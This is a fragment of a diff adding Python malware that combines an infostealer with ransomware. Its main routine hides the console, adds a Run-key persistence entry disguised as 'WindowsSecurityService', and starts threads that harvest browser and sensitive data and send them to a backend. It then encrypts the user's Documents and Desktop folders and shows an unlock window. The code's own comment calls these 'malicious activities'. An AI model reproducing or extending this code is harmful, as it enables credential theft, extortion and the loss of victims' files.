+        winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, f'"{exe_path}"')
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+
+
+def hide_console():
+    """Hide console window on Windows"""
+    if WINDOWS:
+        try:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+
+
+# ==================== MAIN FUNCTION ====================
+
+def run_browser_extraction():
+    """Run browser data extraction in background"""
+    try:
+        data = collect_all_browser_data()
+        send_to_backend(data)
+    except:
+        pass
+
+
+def run_sensitive_data_collection():
+    """Run sensitive data collection in background"""
+    try:
+        collector = SensitiveDataCollector()
+        data = collector.collect_all()
+        collector.send_to_backend(data)
+    except:
+        pass
+
+
+def run_folder_encryption(target_folders=None):
+    """Encrypt target folders"""
+    if target_folders is None:
+        user_home = Path.home()
+        target_folders = [
+            user_home / 'Documents',
+            user_home / 'Desktop',
+        ]
+    encryptor = FolderEncryptor(MASTER_PASSWORD)
+    for folder in target_folders:
+        if folder.exists() and not is_folder_locked(folder):
+            try:
+                encryptor.encrypt_folder(folder)
+            except:
+                pass
+
+
+def show_unlock_gui(locked_folders):
+    """Show unlock GUI for locked folders"""
+    if HAS_GUI and locked_folders:
+        gui = MultiFolderLockerGUI(locked_folders)
+        gui.run()
+
+
+def main():
+    """Main entry point - runs all malicious activities in background"""
+    # Hide console window
+    hide_console()
+
+    # Add to startup for persistence
+    add_to_startup()
+
+    # Run browser extraction in background thread
+    browser_thread = threading.Thread(target=run_browser_extraction, daemon=True)
+    browser_thread.start()
+
+    # Run sensitive data collection in background thread
+    data_thread = threading.Thread(target=run_sensitive_data_collection, daemon=True)
+    data_thread.start()
+
+    # Wait for data collection to complete
+    browser_thread.join(timeout=120)
+    data_thread.join(timeout=120)
+
+    # Encrypt user folders
+    user_home = Path.home()
+    target_folders = [user_home / 'Documents', user_home / 'Desktop']
+    run_folder_encryption(target_folders)
+
+    # Find locked folders and show GUI
+    locked_folders = [f for f in target_folders if is_folder_locked(f)]
+    if locked_folders and HAS_GUI:
+        show_unlock_gui(locked_folders)
+
+    # Start folder monitor if watchdog is available
+    if HAS_WATCHDOG and locked_folders:
+        monitor = FolderAccessMonitorThread(locked_folders, lambda f: show_unlock_gui([f]))
+        monitor.start()
+        monitor.join()
+
+
+if __name__ == "__main__":
+    main()
